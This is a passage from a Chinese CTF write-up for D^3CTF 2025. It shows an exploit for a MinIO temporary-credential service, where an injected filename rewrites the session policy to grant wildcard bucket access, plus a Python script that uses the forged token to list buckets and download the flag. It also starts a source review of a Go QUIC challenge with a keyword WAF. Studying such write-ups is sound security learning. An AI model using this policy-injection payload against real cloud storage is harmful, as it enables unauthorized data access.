class="attr">&quot;secret_access_key&quot;</span><span class="punctuation">:</span><span class="string">&quot;fMKE5GeLwWTs2EyxYKkUOApocFKooJqM+bDJYcox&quot;</span><span class="punctuation">,</span></span></span><br><span class="line"><span class="language-json"><span class="attr">&quot;session_token&quot;</span><span class="punctuation">:</span><span class="string">&quot;eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJhY2Nlc3NLZXkiOiI3U1dZWUs1UU5QT05FOEgzWE1YOSIsImV4cCI6MTc0OTA0NTIwNCwicGFyZW50IjoiQjlNMzIwUVhIRDM4V1VSMk1JWTMiLCJzZXNzaW9uUG9saWN5IjoiZXlKV1pYSnphVzl1SWpvaU1qQXhNaTB4TUMweE55SXNJbE4wWVhSbGJXVnVkQ0k2VzNzaVJXWm1aV04wSWpvaVFXeHNiM2NpTENKQlkzUnBiMjRpT2xzaWN6TTZSMlYwVDJKcVpXTjBJaXdpY3pNNlVIVjBUMkpxWldOMElsMHNJbEpsYzI5MWNtTmxJanBiSW1GeWJqcGhkM002Y3pNNk9qcGtNMmx1ZG1sMFlYUnBiMjR2TWpBeU5EQTNNRFF4T1RNM01EZ3VhbkJuSWwxOVhYMD0ifQ.s9NFu0aVSWX1rHAlgtaZ0kyHUqV1bfGzUsJsyvkmj9izO6Rf69VP15oz4LuWXChIrKa6uOWpuNyPN0e8X7dWdA&quot;</span></span></span><br><span class="line"><span class="language-json"><span class="punctuation">&#125;</span></span></span><br></pre></td></tr></table></figure><p>把这一段<code>session_token</code>放jwt解一下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;accessKey&quot;: &quot;7SWYYK5QNPONE8H3XMX9&quot;,</span><br><span class="line">  &quot;exp&quot;: 1749045204,</span><br><span class="line">  &quot;parent&quot;: &quot;B9M320QXHD38WUR2MIY3&quot;,</span><br><span class="line">  &quot;sessionPolicy&quot;: &quot;eyJWZXJzaW9uIjoiMjAxMi0xMC0xNyIsIlN0YXRlbWVudCI6W3siRWZmZWN0IjoiQWxsb3ciLCJBY3Rpb24iOlsiczM6R2V0T2JqZWN0IiwiczM6UHV0T2JqZWN0Il0sIlJlc291cmNlIjpbImFybjphd3M6czM6OjpkM2ludml0YXRpb24vMjAyNDA3MDQxOTM3MDguanBnIl19XX0=&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现还有一段<code>sessionPolicy</code>，也解一下:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;Version&quot;: &quot;2012-10-17&quot;,</span><br><span class="line">  &quot;Statement&quot;: [</span><br><span class="line">    &#123;</span><br><span class="line">      &quot;Effect&quot;: &quot;Allow&quot;,</span><br><span class="line">      &quot;Action&quot;: [</span><br><span class="line">        &quot;s3:GetObject&quot;,</span><br><span class="line">        &quot;s3:PutObject&quot;</span><br><span class="line">      ],</span><br><span class="line">      &quot;Resource&quot;: [</span><br><span class="line">        &quot;arn:aws:s3:::d3invitation/20240704193708.jpg&quot;</span><br><span class="line">      ]</span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里就是明文了<br>文件池是用AWS策略储存的<br>尝试后发现可以闭合，因为服务端直接对文件名进行拼接<br>那么使用一下我们的wp上的文件名，手动拼出来：</p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;Version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2012-10-17&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;Statement&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;Effect&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Allow&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Action&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="string">&quot;s3:GetObject&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;s3:PutObject&quot;</span></span><br><span class="line">      <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Resource&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="string">&quot;arn:aws:s3:::d3invitation/&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;Action&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span></span><br><span class="line">            <span class="string">&quot;s3:GetObject&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="string">&quot;s3:PutObject&quot;</span><span class="punctuation">]</span></span><br><span class="line">            </span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;Effect&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Allow&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;Action&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">            <span class="string">&quot;s3:GetObject&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="string">&quot;s3:PutObject&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="string">&quot;s3:ListBucket&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="string">&quot;s3:ListAllMyBuckets&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="string">&quot;s3:GetBucketLocation&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span><span class="attr">&quot;Resource&quot;</span><span class="punctuation">:</span> <span class="string">&quot;*&quot;</span></span><br><span class="line">     <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span>aaa<span class="string">&quot;</span></span><br><span class="line"><span class="string">      ]</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">  ]</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure><p>这个作为json结构我个人感觉其实有点问题<br>因为第一个Statement中有两个action<br>然后后面也有乱数据无法去掉<br>但是经过服务端好像会自动纠错<br>发下来就变成修正后的数据了：</p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;Version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2012-10-17&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;Statement&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;Effect&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Allow&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Action&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="string">&quot;s3:GetObject&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;s3:PutObject&quot;</span></span><br><span class="line">      <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Resource&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="string">&quot;arn:aws:s3:::d3invitation/&quot;</span></span><br><span class="line">      <span class="punctuation">]</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;Effect&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Allow&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Action&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="string">&quot;s3:PutObject&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;s3:GetBucketLocation&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;s3:GetObject&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;s3:ListAllMyBuckets&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;s3:ListBucket&quot;</span></span><br><span class="line">      <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Resource&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="string">&quot;**&quot;</span></span><br><span class="line">      <span class="punctuation">]</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>当然也可以用官方wp的<code>s3:*</code>写法<br>这样的token就是minio服务的所有权限<br>以上就是核心思路<br>如何使用token去访问minio服务就是云安全的内容了<br>以后学到会想起来这题的<br>当然这里可以用python脚本完成</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> minio <span class="keyword">import</span> Minio</span><br><span class="line"><span class="keyword">from</span> minio.error <span class="keyword">import</span> S3Error</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">BASE_URL = <span class="string">&quot;http://35.241.98.126:31138&quot;</span>  <span class="comment"># ← 改成你的目标地址</span></span><br><span class="line">UPLOAD_FILENAME = <span class="string">&#x27;&quot;],\&quot;Action\&quot;:[\&quot;s3:GetObject\&quot;,\&quot;s3:PutObject\&quot;]&#125;,&#123;&quot;Effect&quot;: &quot;Allow&quot;,&quot;Action&quot;: [&quot;s3:GetObject&quot;,&quot;s3:PutObject&quot;,&quot;s3:ListBucket&quot;,&quot;s3:ListAllMyBuckets&quot;,&quot;s3:GetBucketLocation&quot;],&quot;Resource&quot;: &quot;*&quot;&#125;]&#125;aaa&#x27;</span></span><br><span class="line">UPLOAD_CONTENT = <span class="string">b&quot;This is a test file from attacker.&quot;</span></span><br><span class="line">ACCESS_KEY = <span class="string">&quot;&quot;</span></span><br><span class="line">SECRET_KEY = <span class="string">&quot;&quot;</span></span><br><span class="line">BUCKET_NAME = <span class="string">&quot;flag&quot;</span></span><br><span class="line">SESSION_TOKEN=<span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Step 1: 获取临时凭证</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_temp_creds</span>(<span class="params">object_name</span>):</span><br><span class="line">    <span class="keyword">global</span> ACCESS_KEY, SECRET_KEY, SESSION_TOKEN</span><br><span class="line">    url = <span class="string">f&quot;<span class="subst">&#123;BASE_URL&#125;</span>/api/genSTSCreds&quot;</span></span><br><span class="line">    data = &#123;<span class="string">&quot;object_name&quot;</span>: object_name&#125;</span><br><span class="line">    resp = requests.post(url, json=data)</span><br><span class="line">    resp.raise_for_status()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] 获取临时凭证成功&quot;</span>)</span><br><span class="line">    <span class="comment"># temp=json.loads()</span></span><br><span class="line">    ACCESS_KEY= resp.json()[<span class="string">&#x27;access_key_id&#x27;</span>]</span><br><span class="line">    SECRET_KEY=resp.json()[<span class="string">&#x27;secret_access_key&#x27;</span>]</span><br><span class="line">    SESSION_TOKEN=resp.json()[<span class="string">&#x27;session_token&#x27;</span>]</span><br><span class="line">    <span class="keyword">return</span> ACCESS_KEY,SECRET_KEY,SESSION_TOKEN</span><br><span class="line"><span class="comment"># MinIO server configuration</span></span><br><span class="line">get_temp_creds(UPLOAD_FILENAME)</span><br><span class="line"><span class="comment"># Initialize the MinIO client</span></span><br><span class="line"><span class="built_in">print</span>(ACCESS_KEY)</span><br><span class="line"><span class="built_in">print</span>(SECRET_KEY)</span><br><span class="line"><span class="built_in">print</span>(SESSION_TOKEN)</span><br><span class="line">minio_client = Minio(</span><br><span class="line">    <span class="string">&quot;35.241.98.126:31500&quot;</span>,</span><br><span class="line">    access_key=ACCESS_KEY,</span><br><span class="line">    secret_key=SECRET_KEY,</span><br><span class="line">    session_token=SESSION_TOKEN,</span><br><span class="line">    secure=<span class="literal">False</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">download_file</span>(<span class="params">object_name, download_path</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Download a file from the MinIO bucket.&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        minio_client.fget_object(BUCKET_NAME, object_name, download_path)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[+] File &#x27;<span class="subst">&#123;object_name&#125;</span>&#x27; downloaded to &#x27;<span class="subst">&#123;download_path&#125;</span>&#x27;&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> S3Error <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[-] Error downloading file: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">list_objects</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;List all objects in the MinIO bucket.&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        objects = minio_client.list_objects(BUCKET_NAME)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] Objects in bucket:&quot;</span>)</span><br><span class="line">        <span class="keyword">for</span> obj <span class="keyword">in</span> objects:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;  - <span class="subst">&#123;obj.object_name&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> S3Error <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[-] Error listing objects: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">list_buckets</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;List all buckets in the MinIO server.&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        buckets = minio_client.list_buckets()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] Buckets:&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(buckets)</span><br><span class="line">        <span class="keyword">for</span> bucket <span class="keyword">in</span> buckets:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;  - <span class="subst">&#123;bucket.name&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> S3Error <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[-] Error listing buckets: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">list_buckets()</span><br><span class="line">list_objects()</span><br><span class="line">download_file(<span class="string">&quot;flag&quot;</span>, <span class="string">&quot;1.txt&quot;</span>)</span><br></pre></td></tr></table></figure><h3 id="tidy-quic"><a href="#tidy-quic" class="headerlink" title="tidy quic"></a>tidy quic</h3><p>对源码进行一个审：</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main <span class="comment">// 声明该文件属于 main 包，表示这是一个可执行程序</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> ( <span class="comment">// 导入所需的标准库和第三方库</span></span><br><span class="line"><span class="string">&quot;bytes&quot;</span>                 <span class="comment">// 导入 bytes 包，用于处理字节切片</span></span><br><span class="line"><span class="string">&quot;errors&quot;</span>                <span class="comment">// 导入 errors 包，用于创建和处理错误</span></span><br><span class="line"><span class="string">&quot;github.com/libp2p/go-buffer-pool&quot;</span> <span class="comment">// 导入 go-buffer-pool 库，用于高效地管理字节缓冲区</span></span><br><span class="line"><span class="string">&quot;github.com/quic-go/quic-go/http3&quot;</span> <span class="comment">// 导入 quic-go/http3 库，用于支持 HTTP/3</span></span><br><span class="line"><span class="string">&quot;io&quot;</span>                    <span class="comment">// 导入 io 包，提供了 I/O 原始操作接口</span></span><br><span class="line"><span class="string">&quot;log&quot;</span>                   <span class="comment">// 导入 log 包，用于记录日志</span></span><br><span class="line"><span class="string">&quot;net/http&quot;</span>              <span class="comment">// 导入 net/http 包，提供了 HTTP 客户端和服务器的实现</span></span><br><span class="line"><span class="string">&quot;os&quot;</span>                    <span class="comment">// 导入 os 包，提供了操作系统功能，例如访问环境变量</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> p pool.BufferPool <span class="comment">// 声明一个全局变量 p，类型为 buffer-pool 库中的 BufferPool，用于管理字节缓冲区</span></span><br><span class="line"><span class="keyword">var</span> ErrWAF = errors.New(<span class="string">&quot;WAF&quot;</span>) <span class="comment">// 声明一个自定义错误 ErrWAF，用于表示被 WAF (Web Application Firewall) 拦截</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123; <span class="comment">// 程序入口点</span></span><br><span class="line"><span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123; <span class="comment">// 启动一个 Goroutine (轻量级线程)</span></span><br><span class="line"><span class="comment">// 在 8080 端口上启动一个 HTTPS 服务器，使用 server.crt 和 server.key 作为 TLS 证书和密钥</span></span><br><span class="line"><span class="comment">// 请求处理逻辑由 &amp;mux&#123;&#125; (自定义的 mux 类型实例) 提供</span></span><br><span class="line">err := http.ListenAndServeTLS(<span class="string">&quot;:8080&quot;</span>, <span class="string">&quot;./server.crt&quot;</span>, <span class="string">&quot;./server.key&quot;</span>, &amp;mux&#123;&#125;)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123; <span class="comment">// 如果服务器启动失败，记录致命错误并退出</span></span><br><span class="line">log.Fatalln(err)</span><br><span class="line">&#125;</span><br><span class="line">&#125;() <span class="comment">// 立即执行这个匿名函数</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123; <span class="comment">// 启动另一个 Goroutine</span></span><br><span class="line"><span class="comment">// 在 8080 端口上启动一个 HTTP/3 (基于 QUIC) 服务器，使用 server.crt 和 server.key 作为证书和密钥</span></span><br><span class="line"><span class="comment">// 请求处理逻辑同样由 &amp;mux&#123;&#125; 提供</span></span><br><span class="line">err := http3.ListenAndServeQUIC(<span class="string">&quot;:8080&quot;</span>, <span class="string">&quot;./server.crt&quot;</span>, <span class="string">&quot;./server.key&quot;</span>, &amp;mux&#123;&#125;)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123; <span class="comment">// 如果服务器启动失败，记录致命错误并退出</span></span><br><span class="line">log.Fatalln(err)</span><br><span class="line">&#125;</span><br><span class="line">&#125;() <span class="comment">// 立即执行这个匿名函数</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> &#123;&#125; <span class="comment">// 这是一个空的 select 语句，会阻塞 main Goroutine，防止程序退出</span></span><br><span class="line"><span class="comment">// 这样可以确保上面启动的两个 Goroutine (HTTP/TLS 和 HTTP/3 服务器) 持续运行</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> mux <span class="keyword">struct</span> &#123; <span class="comment">// 定义一个名为 mux 的结构体</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 为 mux 结构体实现 http.Handler 接口的 ServeHTTP 方法</span></span><br><span class="line"><span class="comment">// 这个方法负责处理所有的 HTTP 请求</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(*mux)</span></span> ServeHTTP(w http.ResponseWriter, r *http.Request) &#123;</span><br><span class="line"><span class="keyword">if</span> r.Method == http.MethodGet &#123; <span class="comment">// 如果请求方法是 GET</span></span><br><span class="line"><span class="comment">// 向客户端写入一个固定的欢迎消息</span></span><br><span class="line">_, _ = w.Write([]<span class="type">byte</span>(<span class="string">&quot;Hello D^3CTF 2025,I&#x27;m tidy quic in web.&quot;</span>))</span><br><span class="line"><span class="keyword">return</span> <span class="comment">// 结束处理并返回</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> r.Method != http.MethodPost &#123; <span class="comment">// 如果请求方法不是 POST (且不是 GET)</span></span><br><span class="line">w.WriteHeader(<span class="number">400</span>) <span class="comment">// 设置 HTTP 状态码为 400 (Bad Request)</span></span><br><span class="line"><span class="keyword">return</span>             <span class="comment">// 结束处理并返回</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> buf []<span class="type">byte</span>         <span class="comment">// 声明一个字节切片 buf，用于存储请求体数据</span></span><br><span class="line">length := <span class="type">int</span>(r.ContentLength) <span class="comment">// 获取请求体的 Content-Length</span></span><br><span class="line"><span class="keyword">if</span> length == <span class="number">-1</span> &#123;              <span class="comment">// 如果 Content-Length 为 -1，表示长度未知 (通常是分块传输或流式传输)</span></span><br><span class="line"><span class="keyword">var</span> err <span class="type">error</span></span><br><span class="line"><span class="comment">// 从请求体中读取所有数据，并包装一个 textInterrupterWrap 以进行内容检查</span></span><br><span class="line">buf, err = io.ReadAll(textInterrupterWrap(r.Body))</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123; <span class="comment">// 如果读取过程中发生错误</span></span><br><span class="line"><span class="keyword">if</span> errors.Is(err, ErrWAF) &#123; <span class="comment">// 如果错误是 ErrWAF (被 WAF 拦截)</span></span><br><span class="line">w.WriteHeader(<span class="number">400</span>)                     <span class="comment">// 设置状态码为 400</span></span><br><span class="line">_, _ = w.Write([]<span class="type">byte</span>(<span class="string">&quot;WAF&quot;</span>))          <span class="comment">// 返回 &quot;WAF&quot; 消息</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123; <span class="comment">// 其他错误</span></span><br><span class="line">w.WriteHeader(<span class="number">500</span>)                     <span class="comment">// 设置状态码为 500 (Internal Server Error)</span></span><br><span class="line">_, _ = w.Write([]<span class="type">byte</span>(<span class="string">&quot;error&quot;</span>))        <span class="comment">// 返回 &quot;error&quot; 消息</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="comment">// 结束处理并返回</span></span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123; <span class="comment">// 如果 Content-Length 已知</span></span><br><span class="line">buf = p.Get(length)     <span class="comment">// 从缓冲区池中获取一个指定长度的字节切片</span></span><br><span class="line"><span class="keyword">defer</span> p.Put(buf)        <span class="comment">// 在函数返回前将缓冲区放回池中，避免内存泄漏</span></span><br><span class="line">rd := textInterrupterWrap(r.Body) <span class="comment">// 包装请求体，以便进行内容检查</span></span><br><span class="line">i := <span class="number">0</span>                  <span class="comment">// 初始化已读取的字节数</span></span><br><span class="line"><span class="keyword">for</span> &#123;                   <span class="comment">// 循环读取请求体</span></span><br><span class="line">n, err := rd.Read(buf[i:]) <span class="comment">// 从包装过的请求体中读取数据到 buf 中</span></span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;         <span class="comment">// 如果读取发生错误</span></span><br><span class="line"><span class="keyword">if</span> errors.Is(err, io.EOF) &#123; <span class="comment">// 如果是文件结束符 (EOF)，表示读取完毕</span></span><br><span class="line"><span class="keyword">break</span> <span class="comment">// 跳出循环</span></span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> errors.Is(err, ErrWAF) &#123; <span class="comment">// 如果是 ErrWAF</span></span><br><span class="line">w.WriteHeader(<span class="number">400</span>)                     <span class="comment">// 设置状态码为 400</span></span><br><span class="line">_, _ = w.Write([]<span class="type">byte</span>(<span class="string">&quot;WAF&quot;</span>))          <span class="comment">// 返回 &quot;WAF&quot; 消息</span></span><br><span class="line"><span class="keyword">return</span>                                 <span class="comment">// 结束处理并返回</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123; <span class="comment">// 其他错误</span></span><br><span class="line">w.WriteHeader(<span class="number">500</span>)                     <span class="comment">// 设置状态码为 500</span></span><br><span class="line">_, _ = w.Write([]<span class="type">byte</span>(<span class="string">&quot;error&quot;</span>))        <span class="comment">// 返回 &quot;error&quot; 消息</span></span><br><span class="line"><span class="keyword">return</span>                                 <span class="comment">// 结束处理并返回</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">i += n <span class="comment">// 更新已读取的字节数</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查请求体是否以 &quot;I want&quot; 开头</span></span><br><span class="line"><span class="keyword">if</span> !bytes.HasPrefix(buf, []<span class="type">byte</span>(<span class="string">&quot;I want&quot;</span>)) &#123;</span><br><span class="line">_, _ = w.Write([]<span class="type">byte</span>(<span class="string">&quot;Sorry I&#x27;m not clear what you want.&quot;</span>)) <span class="comment">// 如果不是，返回错误消息</span></span><br><span class="line"><span class="keyword">return</span>                                                    <span class="comment">// 结束处理并返回</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 从请求体中去除 &quot;I want&quot; 前缀，并去除前后空白</span></span><br><span class="line">item := bytes.TrimSpace(bytes.TrimPrefix(buf, []<span class="type">byte</span>(<span class="string">&quot;I want&quot;</span>)))</span><br><span class="line"><span class="keyword">if</span> bytes.Equal(item, []<span class="type">byte</span>(<span class="string">&quot;flag&quot;</span>)) &#123; <span class="comment">// 如果处理后的内容是 &quot;flag&quot;</span></span><br><span class="line">_, _ = w.Write([]<span class="type">byte</span>(os.Getenv(<span class="string">&quot;FLAG&quot;</span>))) <span class="comment">// 返回环境变量 FLAG 的值</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123; <span class="comment">// 否则</span></span><br><span class="line">_, _ = w.Write(item) <span class="comment">// 返回处理后的内容</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义一个 wrap 结构体，它嵌入了 io.ReadCloser 接口，并添加了额外的字段用于 WAF 逻辑</span></span><br><span class="line"><span class="keyword">type</span> wrap <span class="keyword">struct</span> &#123;</span><br><span class="line">io.ReadCloser <span class="comment">// 嵌入 io.ReadCloser 接口，这样 wrap 类型就自动拥有 Read 和 Close 方法</span></span><br><span class="line">ban           []<span class="type">byte</span> <span class="comment">// 用于存储禁止的字节序列 (例如 &quot;flag&quot;)</span></span><br><span class="line">idx           <span class="type">int</span>    <span class="comment">// 用于跟踪当前匹配到 ban 序列的索引</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 为 wrap 结构体实现 Read 方法，这是 io.Reader 接口的一部分</span></span><br><span class="line"><span class="comment">// 这个方法会在读取数据时进行 WAF 检查</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(w *wrap)</span></span> Read(p []<span class="type">byte</span>) (<span class="type">int</span>, <span class="type">error</span>) &#123;</span><br><span class="line">n, err := w.ReadCloser.Read(p) <span class="comment">// 首先调用底层 io.ReadCloser 的 Read 方法读取数据</span></span><br><span class="line"><span class="comment">// 如果读取出错且不是 EOF (文件结束符)</span></span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &amp;&amp; !errors.Is(err, io.EOF) &#123;</span><br><span class="line"><span class="keyword">return</span> n, err <span class="comment">// 直接返回错误</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 遍历刚刚读取到的数据 p</span></span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; n; i++ &#123;</span><br><span class="line"><span class="comment">// 如果当前字节与 ban 序列中当前期望的字节匹配</span></span><br><span class="line"><span class="keyword">if</span> p[i] == w.ban[w.idx] &#123;</span><br><span class="line">w.idx++ <span class="comment">// 匹配索引递增</span></span><br><span class="line"><span class="keyword">if</span> w.idx == <span class="built_in">len</span>(w.ban) &#123; <span class="comment">// 如果整个 ban 序列都匹配上了</span></span><br><span class="line"><span class="keyword">return</span> n, ErrWAF <span class="comment">// 返回 ErrWAF 错误，表示触发了 WAF</span></span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123; <span class="comment">// 如果不匹配</span></span><br><span class="line">w.idx = <span class="number">0</span> <span class="comment">// 重置匹配索引</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> n, err <span class="comment">// 返回读取到的字节数和原始的错误</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// textInterrupterWrap 函数用于创建一个新的 wrap 实例，包装给定的 io.ReadCloser</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">textInterrupterWrap</span><span class="params">(rc io.ReadCloser)</span></span> io.ReadCloser &#123;</span><br><span class="line"><span class="keyword">return</span> &amp;wrap&#123; <span class="comment">// 返回一个 wrap 结构体实例的指针</span></span><br><span class="line">rc,         <span class="comment">// 嵌入原始的 io.ReadCloser</span></span><br><span class="line">[]<span class="type">byte</span>(<span class="string">&quot;flag&quot;</span>), <span class="comment">// 设置禁止的字节序列为 &quot;flag&quot;</span></span><br><span class="line"><span class="number">0</span>,          <span class="comment">// 初始匹配索引为 0</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>梳理一下运行流程<br>运行程序执行<code>main</code>函数<br>然后启动两个服务器，分别是<code>http</code>和<code>http3</code>的协议<br>这两个服务是同时运行的</p><p>两个服务的处理逻辑都是mux（自定义的多路复用器）</p><p>接收到请求时，<br>如果是GET请求，就返回一句欢迎：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Hello 